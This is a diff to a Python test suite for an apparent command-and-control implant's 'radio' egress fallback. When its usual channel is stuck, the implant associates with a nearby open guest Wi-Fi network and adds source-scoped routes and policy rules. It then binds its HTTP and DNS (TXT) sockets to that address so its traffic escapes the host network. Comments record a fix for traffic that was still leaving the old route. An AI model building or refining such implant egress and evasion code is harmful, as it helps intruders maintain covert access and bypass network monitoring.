@@ -27,6 +27,7 @@ passwords; the verb's answer names the account and the proxy.
 
 import base64
 import io
+import socket
 import json
 import os
 import shutil
@@ -364,10 +365,23 @@ class TestTheRadioVerb(RadioCase):
         self.assertIn("ip link set wlan0 up", joined)
         self.assertTrue(any("iw dev wlan0 connect GuestWifi" in line
                             for line in joined), joined)
-        self.assertIn("ip addr add 192.168.9.42/24 dev wlan0", joined)
-        self.assertIn("ip route add default via 192.168.9.1 dev wlan0 "
+        # `replace` and not `add`, both of them: a second attempt is the
+        # ordinary case -- no verb tests its own result -- and `add`
+        # answers "File exists", which used to roll the working
+        # association back on top of itself.
+        self.assertIn("ip addr replace 192.168.9.42/24 dev wlan0", joined)
+        self.assertIn("ip route replace default via 192.168.9.1 dev wlan0 "
                       "table 100", joined)
         self.assertIn("ip rule add from 192.168.9.42 table 100", joined)
+        # And the rule is removed before it is added, because `ip rule
+        # add` has no `replace` and stacks silently.
+        self.assertLess(joined.index("ip rule del from 192.168.9.42 "
+                                     "table 100"),
+                        joined.index("ip rule add from 192.168.9.42 "
+                                     "table 100"))
+        # Nothing flushes the interface: an operator's management address
+        # on the onboard radio is not this rung's to delete.
+        self.assertNotIn("ip addr flush dev wlan0", joined)
         self.assertIn("GuestWifi", answer)
         self.assertIn("192.168.9.42", answer)
         self.assertIn("Not a test", answer)
@@ -471,6 +485,96 @@ class TestTheRadioVerb(RadioCase):
         self.assertIn("Visitors", answer)
         self.assertTrue(any("connect Visitors" in " ".join(a) for a in ran))
 
+    def test_the_scoped_route_is_one_this_implant_can_actually_use(self):
+        # The sharp end of the rung, and it did not work: `ip rule from
+        # <addr>` matches only packets whose *source* is that address, and
+        # for a locally-generated connection the kernel looks the route up
+        # with an unspecified source -- so table 100 was unreachable and
+        # the implant's traffic kept leaving exactly where it did before,
+        # while the verb reported success. Something has to bind it.
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon)
+        answer = beacon._exec_egress("radio")
+
+        self.assertNotIn("[error]", answer)
+        self.assertEqual(beacon._way_out_source, "192.168.9.42")
+        # And the sockets that carry this implant's traffic use it.
+        session = beacon._proxy_session or beacon_mod._HttpSession()
+        self.assertEqual(session.source_address, ("192.168.9.42", 0))
+        self.assertIn("192.168.9.42", answer)
+
+    def test_a_dns_query_leaves_from_the_same_address(self):
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("radio")
+
+        bound = []
+
+        class FakeSocket(object):
+            def __init__(self, *_a, **_k):
+                pass
+
+            def settimeout(self, _seconds):
+                pass
+
+            def bind(self, address):
+                bound.append(address)
+
+            def sendto(self, *_a):
+                pass
+
+            def recvfrom(self, _size):
+                # Twelve bytes of nothing: enough for `_dns_query` to
+                # return an empty answer rather than raise, which keeps
+                # this test about the bind and nothing else.
+                return b"\x00" * 12, ("10.0.0.2", 53)
+
+            def close(self):
+                pass
+
+        with mock.patch.object(beacon_mod.socket, "socket", FakeSocket):
+            beacon_mod._dns_query("x.lan", "TXT", "10.0.0.2", timeout=1,
+                                  source=beacon._way_out_source)
+        self.assertEqual(bound, [("192.168.9.42", 0)])
+
+    def test_the_source_is_dropped_when_a_leg_delivers(self):
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("radio")
+        self.assertTrue(beacon._way_out_source)
+
+        beacon._leg_recovered()
+        self.assertEqual(beacon._way_out_source, "")
+        self.assertIsNone(beacon._proxy_session.source_address)
+
+    def test_a_rollback_drops_the_source_too(self):
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon, fail_at="ip rule add")
+        self.assertIn("[error]", beacon._exec_egress("radio"))
+        self.assertEqual(beacon._way_out_source, "")
+
+    def test_a_failed_retry_unbinds_what_the_first_attempt_bound(self):
+        # The only path on which the rollback's unbind is reachable, and
+        # it is the ordinary one: the first attempt succeeded and bound
+        # the lease, the second failed, and the association is gone -- so
+        # sockets pinned to an address on a network the implant is no
+        # longer associated with would be sockets that cannot reach
+        # anything at all.
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon)
+        self.assertNotIn("[error]", beacon._exec_egress("radio"))
+        self.assertEqual(beacon._way_out_source, "192.168.9.42")
+
+        self.radio(beacon, fail_at="iw dev wlan0 connect")
+        self.assertIn("[error]", beacon._exec_egress("radio"))
+        self.assertEqual(beacon._way_out_source, "")
+        self.assertIsNone(beacon._proxy_session.source_address)
+
     def test_a_second_attempt_does_not_tear_down_a_working_one(self):
         # No verb tests its own result, so the policy keeps choosing
         # `radio` on the next stuck cycle: a second attempt is the
@@ -487,10 +591,6 @@ class TestTheRadioVerb(RadioCase):
         answer = beacon._exec_egress("radio")
         joined = [" ".join(argv) for argv in ran]
         self.assertNotIn("[error]", answer, joined)
-        self.assertIn("ip addr flush dev wlan0", joined,
-                      "a second attempt has to clear the address the first "
-                      "one installed, or it fails on File exists: %r"
-                      % joined)
         self.assertNotIn("iw dev wlan0 disconnect", joined,
                          "a second attempt tore down the first one's "
                          "association: %r" % joined)
